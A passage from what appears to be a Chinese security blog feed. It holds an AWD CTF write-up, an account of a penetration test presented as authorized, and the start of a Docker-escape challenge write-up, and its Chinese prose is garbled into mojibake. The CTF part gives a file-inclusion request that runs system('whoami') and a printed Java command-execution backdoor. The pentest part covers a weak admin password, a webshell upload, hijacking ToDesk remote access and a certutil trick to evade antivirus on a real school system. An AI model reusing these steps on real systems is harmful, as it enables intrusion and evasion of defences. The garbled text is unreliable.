<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@NodeAnnotation</span>(title=&quot;ç¦»çº¿å®‰è£…&quot;)</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">localinstall</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isAjax</span>())&#123;<br>        <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$urls</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;url&#x27;</span>));<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$urls</span>[<span class="hljs-string">&#x27;path&#x27;</span>]??<span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-variable">$res</span> = <span class="hljs-title class_">ZipHelper</span>::<span class="hljs-title function_ invoke__">unzip</span>(<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$file</span>,<span class="hljs-string">&#x27;../addons&#x27;</span>);<br>            &#125;<span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>)&#123;<br>                <span class="hljs-variable">$index</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$res</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br>                <span class="hljs-variable">$addon</span> = <span class="hljs-variable">$index</span> ? <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$res</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$index</span>):<span class="hljs-variable">$res</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">install</span>(<span class="hljs-variable">$addon</span>,<span class="hljs-string">&#x27;local&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">success</span>(<span class="hljs-string">&#x27;upload success&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>&#x2F;vendor&#x2F;funadmin&#x2F;fun-addons&#x2F;src&#x2F;helper&#x2F;ZipHelper.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  è§£å‹æ–‡ä»¶</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $zipFile ç›¸å¯¹æ–‡ä»¶è·¯åŠ²</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $folderPath ç›¸å¯¹æ–‡ä»¶å¤¹è·¯åŠ²</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unzip</span>(<span class="hljs-params"> <span class="hljs-variable">$zipFile</span>,<span class="hljs-variable">$folderPath</span>,<span class="hljs-variable">$addon</span>=<span class="hljs-number">0</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Initialize archive object</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-string">&#x27;ZipArchive&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Exception</span>(<span class="hljs-string">&#x27;ZinArchive not find&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\ZipArchive</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipFile</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Exception</span>(<span class="hljs-string">&#x27;Unable to open the zip file&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$folderPath</span>)) &#123;<br>        @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$folderPath</span>, <span class="hljs-number">0755</span>);<br>    &#125;<br>    <span class="hljs-variable">$fileDir</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">getNameIndex</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-comment">//è§£å‹å‹ç¼©åŒ…</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-variable">$folderPath</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Exception</span>(<span class="hljs-string">&#x27;Unable to extract the file&#x27;</span>);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileDir</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°è™½ç„¶æŠ¥é”™äº†ï¼Œä½†æ˜¯ä¾ç„¶ä¼šè§£å‹åˆ°addonsç›®å½•ä¸‹</p>
<p><img src="/img/awd/ccb-cms-5.png"></p>
<p>ä½†æ˜¯æ— æ³•è®¿é—®åˆ°ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«ç»„åˆæ‹³è¿›è¡Œåˆ©ç”¨</p>
<p>&#x2F;app&#x2F;backend&#x2F;controller&#x2F;Ajax.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> \think\response\Jsonp</span><br><span class="hljs-comment"> * è‡ªåŠ¨åŠ è½½è¯­è¨€å‡½æ•°</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lang</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/javascript&#x27;</span>);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;controllername&quot;</span>);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">parse_name</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">1</span>));<br>    <span class="hljs-variable">$app</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;app&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">jsonp</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadlang</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$app</span>))-&gt;<span class="hljs-title function_ invoke__">code</span>(<span class="hljs-number">200</span>)-&gt;<span class="hljs-title function_ invoke__">options</span>([<br>        <span class="hljs-string">&#x27;var_jsonp_handler&#x27;</span> =&gt; <span class="hljs-string">&#x27;callback&#x27;</span>,<br>        <span class="hljs-string">&#x27;default_jsonp_handler&#x27;</span> =&gt; <span class="hljs-string">&#x27;jsonpReturn&#x27;</span>,<br>        <span class="hljs-string">&#x27;json_encode_param&#x27;</span> =&gt; JSON_PRETTY_PRINT | JSON_FORCE_OBJECT |JSON_UNESCAPED_UNICODE,<br>    ])-&gt;<span class="hljs-title function_ invoke__">allowCache</span>(<span class="hljs-literal">true</span>)-&gt;<span class="hljs-title function_ invoke__">expires</span>(<span class="hljs-number">7200</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿›loadlangæ–¹æ³•</p>
<p>&#x2F;app&#x2F;common&#x2F;controller&#x2F;Backend.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadlang</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$app</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">cookie</span>(<span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;lang.cookie_var&#x27;</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$app</span> &amp;&amp; <span class="hljs-variable">$app</span>!==<span class="hljs-string">&#x27;backend&#x27;</span>)&#123;<br>        <span class="hljs-variable">$res</span> =  <span class="hljs-title class_">Lang</span>::<span class="hljs-title function_ invoke__">load</span>([<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getBasePath</span>() .<span class="hljs-string">&#x27;backend&#x27;</span>. DS . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getBasePath</span>() .<span class="hljs-variable">$app</span>. DS . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span>  . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getBasePath</span>() .<span class="hljs-variable">$app</span>. DS . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . DS . <span class="hljs-title function_ invoke__">str_replac</span>(<span class="hljs-string">&#x27;.&#x27;</span>, DS, <span class="hljs-variable">$name</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>        ]);<br>   &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title class_">Lang</span>::<span class="hljs-title function_ invoke__">load</span>([<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getAppPath</span>() . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getAppPath</span>() . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . DS . <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;.&#x27;</span>, DS,<span class="hljs-variable">$name</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>        ]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾ï¼Œä» lang.cookie_var é…ç½®ä¸­è·å–ä¸€ä¸ªcookieå€¼å¹¶è¿›è¡Œæ–‡ä»¶åŒ…å«</p>
<p>æŸ¥çœ‹cookie_varçš„åå­—</p>
<p>&#x2F;config&#x2F;lang.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> [<br>    <span class="hljs-comment">// é»˜è®¤è¯­è¨€</span><br>    <span class="hljs-string">&#x27;default_lang&#x27;</span>    =&gt; <span class="hljs-title class_">Env</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;lang.default_lang&#x27;</span>, <span class="hljs-string">&#x27;zh-cn&#x27;</span>),<br>    <span class="hljs-comment">// å…è®¸çš„è¯­è¨€åˆ—è¡¨</span><br>    <span class="hljs-string">&#x27;allow_lang_list&#x27;</span> =&gt; [<span class="hljs-string">&#x27;zh-cn&#x27;</span>,<span class="hljs-string">&#x27;en-us&#x27;</span>],<br>    <span class="hljs-comment">// å¤šè¯­è¨€è‡ªåŠ¨ä¾¦æµ‹å˜é‡å / è‡ªåŠ¨ä¾¦æµ‹çš„GETå˜é‡å</span><br>    <span class="hljs-string">&#x27;detect_var&#x27;</span>      =&gt; <span class="hljs-string">&#x27;lang&#x27;</span>,<br>    <span class="hljs-comment">// æ˜¯å¦ä½¿ç”¨Cookieè®°å½•</span><br>    <span class="hljs-string">&#x27;use_cookie&#x27;</span>      =&gt; <span class="hljs-literal">true</span>,<br>    <span class="hljs-comment">// å¤šè¯­è¨€cookieå˜é‡</span><br>    <span class="hljs-string">&#x27;cookie_var&#x27;</span>      =&gt; <span class="hljs-string">&#x27;think_lang&#x27;</span>,<br>    <span class="hljs-comment">// æ‰©å±•è¯­è¨€åŒ…</span><br>    <span class="hljs-string">&#x27;extend_list&#x27;</span>     =&gt; [],<br>    <span class="hljs-comment">// Accept-Languageè½¬ä¹‰ä¸ºå¯¹åº”è¯­è¨€åŒ…åç§°</span><br>    <span class="hljs-string">&#x27;accept_language&#x27;</span> =&gt; [<br>        <span class="hljs-string">&#x27;zh-hans-cn&#x27;</span> =&gt; <span class="hljs-string">&#x27;zh-cn&#x27;</span>,<br>    ],<br>    <span class="hljs-comment">// æ˜¯å¦æ”¯æŒè¯­è¨€åˆ†ç»„</span><br>    <span class="hljs-string">&#x27;allow_group&#x27;</span>     =&gt; <span class="hljs-literal">true</span>,<br>];<br></code></pre></td></tr></table></figure>

<p>å› ä¸ºæ˜¯å…¨å±€å˜é‡ï¼Œæ‰€ä»¥ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥è°ƒç”¨</p>
<p>åŒ…å«çš„æ—¶å€™æ³¨æ„åç¼€ .php å·²ç»å­˜åœ¨äº†ï¼Œä¸éœ€è¦å†å†™</p>
<p><img src="/img/awd/ccb-cms-4.png"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">POST / HTTP/1.1<br>Host: 0dbaba9b-169b-4afb-ab9d-71f60e228260.ctfd.lewiserii.top:8080<br>Cookie: think_lang=/../../../addons/shell;<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 19<br><br>a=system(&#x27;whoami&#x27;);<br></code></pre></td></tr></table></figure>

<p><strong>ä¿®å¤</strong></p>
<p>å¯¹ $lang è¿›è¡Œè¿‡æ»¤å³å¯</p>
<h1 id="DocToolkit"><a href="#DocToolkit" class="headerlink" title="DocToolkit"></a>DocToolkit</h1><h2 id="æ¼æ´1-é»˜è®¤åé—¨"><a href="#æ¼æ´1-é»˜è®¤åé—¨" class="headerlink" title="æ¼æ´1-é»˜è®¤åé—¨"></a>æ¼æ´1-é»˜è®¤åé—¨</h2><p>å­˜åœ¨é»˜è®¤åé—¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.doctoolkit.controller.test;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/test&quot;&#125;)</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-comment">/* loaded from: DocToolkit-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/doctoolkit/controller/test/TestController.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/backd0or&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">backdoor</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;cmd&quot;)</span> String command)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (command != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osType</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osType != <span class="hljs-literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="hljs-string">&quot;windows&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, command&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmds).start();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len);<br>            <span class="hljs-keyword">return</span> output;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>æ”»å‡»ï¼š</strong></p>
<p><code>/test/backd0or?cmd=cat /flag</code></p>
<p><img src="/img/awd/ccb-DocToolkit-1.png"></p>
<p><strong>ä¿®å¤ï¼š</strong></p>
<p>æ²¡ä¿®å¤æˆåŠŸã€‚ã€‚</p>
<h2 id="æ¼æ´2-shiroååºåˆ—åŒ–"><a href="#æ¼æ´2-shiroååºåˆ—åŒ–" class="headerlink" title="æ¼æ´2-shiroååºåˆ—åŒ–"></a>æ¼æ´2-shiroååºåˆ—åŒ–</h2><p>æœ‰shiroä¾èµ–</p>
<p>åœ¨shiroçš„é…ç½®æ–‡ä»¶ä¸­å‘ç°äº†å›ºå®šç§˜é’¥</p>
<p><img src="/img/awd/ccb-DocToolkit-2.png"></p>
<p>ç›´æ¥ç”¨å·¥å…·æ‰“å°±å¥½äº†ï¼Œç„¶åæŠ“æµé‡è¿›è¡Œæ‰¹é‡</p>
<p><img src="/img/awd/ccb-DocToolkit-3.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>é•¿åŸæ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>xxå¸‚å­¦æ ¡é£Ÿå ‚åŸè¾…ææ–™ç»Ÿä¸€é…é€ç®¡ç†ç³»ç»Ÿ</title>
    <url>/posts/62ba3513/</url>
    <content><![CDATA[<blockquote>
<p>2023.8æœˆåˆæ³•æˆæƒè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œç°å·²ä¿®å¤</p>
</blockquote>
<h1 id="å¤–ç½‘"><a href="#å¤–ç½‘" class="headerlink" title="å¤–ç½‘"></a>å¤–ç½‘</h1><p>åå°å‘ç°åç›´æ¥å°±æ˜¯ä¸€ä¸ªå¼±å£ä»¤</p>
<p>admin&#x2F;7654321</p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-1.png"></p>
<p>æµ‹è¯•åå‘ç°å…¬å‘Šå¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ </p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-2.png"></p>
<p>ä¸Šä¼ ä¸€ä¸ªjsp</p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-3.png"></p>
<p>å†°èè¿æ¥åç›´æ¥æ‹¿ä¸‹</p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-4.png"></p>
<h1 id="å†…ç½‘"><a href="#å†…ç½‘" class="headerlink" title="å†…ç½‘"></a>å†…ç½‘</h1><p>æ¥ç€è¿›è¡Œå½“å‰ä¸»æœºçš„ä¿¡æ¯æ”¶é›†</p>
<p>è½¯ä»¶ï¼šç«ç»’ï¼Œtodeskï¼Œ360æµè§ˆå™¨ç­‰<br>OSï¼šMicrosoft Windows Server 2016 Standard<br>ç½‘æ®µï¼š10.77.0.0&#x2F;24</p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-5.png"></p>
<h2 id="è¿œç¨‹è¿æ¥"><a href="#è¿œç¨‹è¿æ¥" class="headerlink" title="è¿œç¨‹è¿æ¥"></a>è¿œç¨‹è¿æ¥</h2><blockquote>
<p>çœ‹åˆ°ç›®æ ‡å®‰è£…äº†todeskåå°±çªå‘å¥‡æƒ³ï¼Œæƒ³ç€èƒ½ä¸èƒ½è¿æ¥ä¸Šçœ‹çœ‹</p>
</blockquote>
<p>è¿™é‡Œç”¨çš„æ–¹æ³•æ˜¯ä¸Šä¼ todesk+nircmdå®ç°è¿œç¨‹è¿æ¥</p>
<p>Todeskç²¾ç®€ç‰ˆï¼š<a href="https://dl.todesk.com/windows/ToDesk_Lite.exe">https://dl.todesk.com/windows/ToDesk_Lite.exe</a><br>Nircmd: <a href="http://www.nirsoft.net/utils/nircmd.html">http://www.nirsoft.net/utils/nircmd.html</a></p>
<hr>
<p>æ­£å¸¸æƒ…å†µåº”è¯¥æ˜¯è¿è¡ŒToDesk_Lite.exeåæˆªå›¾å¯ä»¥ç›´æ¥çœ‹åˆ°å¯†ç ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-7.png"></p>
<hr>
<p>ä½†æ˜¯å½“æ—¶çš„æƒ…å†µæ˜¯ä¸Šä¼ å®Œåæˆªå›¾å‘ç°æœ‰ä¸€ä¸ªå¼¹çª—</p>
<p>æˆªå›¾å‘½ä»¤ <code>nircmd.exe savescreenshot D:\2.png</code></p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-6.png"></p>
<p>æ¯”todeskçš„ä¼˜å…ˆçº§é«˜ï¼Œè¿™æ ·ä¼šçœ‹ä¸åˆ°çª—å£ç¨‹åºï¼Œæ‰€ä»¥éœ€è¦å…ˆæ€æ‰å¼¹çª—</p>
<p>tasklistæŸ¥çœ‹ï¼Œå¾—åˆ°è¿›ç¨‹åç§°<code>MusNotificationUx.exe</code><br>æ€è¿›ç¨‹ï¼š<code>taskkill /IM &quot;MusNotificationUx.exe&quot;</code></p>
<p>å¦‚æœè¿˜æœ‰å…¶ä»–çª—å£ï¼Œå¯ä»¥ä½¿ç”¨vbså‘½ä»¤æ¸…ç©º</p>
<figure class="highlight vbs"><table><tr><td class="code"><pre><code class="hljs vbs"><span class="hljs-keyword">Dim</span> objSHA<br><span class="hljs-keyword">Set</span> objSHA = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<br>objSHA.ToggleDesktop<br><span class="hljs-keyword">Set</span> objSHA = <span class="hljs-literal">Nothing</span><br><br>ä¸”ç«ç»’ä¸å…è®¸åˆ›å»ºvbsæ–‡ä»¶ï¼Œå¯ä»¥ç”¨ç³»ç»Ÿè‡ªå¸¦çš„certutilå®ç°bypass<br>certutil -encode <span class="hljs-number">1.</span>vbs <span class="hljs-number">1.</span>txt<br>certutil -decode <span class="hljs-number">1.</span>txt <span class="hljs-number">1.</span>vbs<br></code></pre></td></tr></table></figure>

<hr>
<p>æ¸…ç©ºåå†æ¬¡è¿è¡Œå¹¶æˆªå›¾</p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-8.png"></p>
<p>å› ä¸ºè¿è¡Œçš„æ˜¯ç³»ç»Ÿæœ¬èº«å®‰è£…çš„todeskï¼Œè€Œä¸æ˜¯ç²¾ç®€ç‰ˆï¼Œæ‰€ä»¥è¿˜éœ€è¦è·å–è¿æ¥å¯†ç </p>
<p>å¯ä»¥æ‰¾åˆ°config.iniæ–‡ä»¶ä¸­çš„hashï¼Œå¤åˆ¶åˆ°æœ¬åœ°ï¼Œåœ¨æœ¬åœ°å¯åŠ¨todeskæ‹¿åˆ°å¯†ç </p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-9.png"></p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-10.png"></p>
<p>è‡³æ­¤å®ç°todeskè¿æ¥</p>
<p><img src="/img/%E5%86%85%E7%BD%91/intranet1-12.png"></p>
<h2 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h2><p>å°±ä¸è¯¦ç»†æ”¾å›¾äº†ï¼Œéƒ½æ˜¯åŒä¸€ç½‘æ®µçš„</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">AVAäº’åŠ¨ç®¡ç†è½¯ä»¶x1<br>HDMx1<br>Grandstream GXP1610 ä¼ä¸šipç”µè¯ç®¡ç†x4<br>æµ·åº·å¨è§†æ‘„åƒå¤´x2<br>VBCç½‘ç»œæ ¸å¿ƒæ™ºèƒ½ç®¡ç†ç³»ç»Ÿx1<br>h3cè®¾å¤‡x1<br>ä¸»æœºgetshellx3<br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
        <tag>å®æˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title>Be-a-Docker-Escaper-4 &amp; Be-a-Cloud-Hacker</title>
    <url>/posts/90615d01/</url>
    <content><![CDATA[<blockquote>
<p>é¢˜ç›®æ¥è‡ª2024å¹´ç¬¬å…­å±ŠRWCTFä½“éªŒèµ›</p>
</blockquote>
<p>ä¸€é“å…³äºå®¹å™¨é€ƒé€¸çš„é¢˜ç›®</p>
<h2 id="Be-a-Docker-Escaper-4"><a href="#Be-a-Docker-Escaper-4" class="headerlink" title="Be-a-Docker-Escaper-4"></a>Be-a-Docker-Escaper-4</h2><p>sshè¿ä¸Šåå¯ä»¥é€šè¿‡<code>ps -aux</code>å‘½ä»¤çœ‹åˆ°è¿™ä¸ªå®¹å™¨çš„å¯åŠ¨å‘½ä»¤</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><code class="hljs docker">docker <span class="hljs-keyword">run</span><span class="language-bash"> --<span class="hljs-built_in">rm</span> -it --pid=host --security-opt=apparmor=unconfined ubuntu bash</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/docker/docker-e-1.png"></p>
<p>è¿™é‡Œä»‹ç»ä¸‹<code>--pid=host</code>è¿™ä¸ªå‚æ•°ï¼ŒæŒ‡å®šä¸ºhoståä¼šä½¿ç”¨å®¿ä¸»æœºçš„pid namespaceã€‚å¯ä»¥é€šè¿‡pså‘½ä»¤çœ‹åˆ°å®¹å™¨å¤–çš„è¿›ç¨‹</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><code class="hljs docker">--pid=<span class="hljs-string">&quot;&quot;</span>  : Set the PID (Process) Namespace mode for the container,<br>             <span class="hljs-string">&#x27;container:&lt;name|id&gt;&#x27;</span>: joins another container<span class="hljs-string">&#x27;s PID namespace</span><br><span class="hljs-string">             &#x27;</span>host<span class="hljs-string">&#x27;: use the host&#x27;</span>s PID namespace inside the container<br></code></pre></td></tr></table></figure>


<p>å› ä¸ºå®¹å™¨å…±äº«äº†<code>pid</code>ï¼Œå¹¶ä¸”å…³é—­äº†apparmorï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨æŸäº›è¿›ç¨‹çš„<code>/proc/[pid]/root</code>ç¬¦å·é“¾æ¥å®ç°å®¹å™¨é€ƒé€¸</p>
<p>å…ˆæ‰¾åˆ°å®¿ä¸»æœºä¸Šä»¥é root ç”¨æˆ·è¿è¡Œçš„è¿›ç¨‹<br>å¾ˆæ˜æ˜¾æœ‰ä¸ªsleepè¿›ç¨‹</p>
<p><img src="/img/docker/docker-e-2.png"></p>
